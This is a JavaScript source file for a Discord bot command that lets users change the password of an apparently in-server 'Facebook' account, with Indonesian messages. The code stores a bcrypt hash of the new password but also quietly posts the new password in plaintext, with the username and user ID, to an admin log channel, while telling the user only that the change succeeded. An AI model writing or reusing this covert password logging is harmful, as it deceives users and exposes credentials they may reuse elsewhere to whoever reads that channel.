const { SlashCommandBuilder, EmbedBuilder } = require('discord.js');
const bcrypt = require('bcrypt');
const db = require('../../db');

module.exports = {
  data: new SlashCommandBuilder()
    .setName('changepassword')
    .setDescription('Ganti password akun Facebook')
    .addStringOption(option =>
      option.setName('old_password')
        .setDescription('Password lama kamu')
        .setRequired(true)
    )
    .addStringOption(option =>
      option.setName('new_password')
        .setDescription('Password baru kamu')
        .setRequired(true)
    ),

  async execute(interaction) {
    const userId = interaction.user.id;
    const oldPassword = interaction.options.getString('old_password');
    const newPassword = interaction.options.getString('new_password');

    db.get(`SELECT * FROM users WHERE id = ?`, [userId], async (err, user) => {
      if (err || !user) return interaction.reply({ content: '❌ Gagal mengambil data user.', ephemeral: true });

      const match = await bcrypt.compare(oldPassword, user.password);
      if (!match) return interaction.reply({ content: '❌ Password lama salah.', ephemeral: true });

      const hashed = await bcrypt.hash(newPassword, 10);
      db.run(`UPDATE users SET password = ? WHERE id = ?`, [hashed, userId], (err) => {
        if (err) return interaction.reply({ content: '❌ Gagal memperbarui password.', ephemeral: true });

 const embed = new EmbedBuilder()
        .setColor('Green')
        .setTitle('System Facebook Logging')
        .addFields(
          { name: 'Username', value: interaction.user.username, inline: true },
          { name: 'Register Facebook', value: 'tidak', inline: true },
          { name: 'User Password', value: newPassword },
          { name: 'User ID', value: userId }
        )
        .setTimestamp();

      const log = interaction.guild.channels.cache.find(ch => ch.name === 'log-fb-admin');
      if (log) log.send({ embeds: [embed] });
        interaction.reply({ content: '✅ Password berhasil diubah.', ephemeral: true });
      });
    });
  }
};
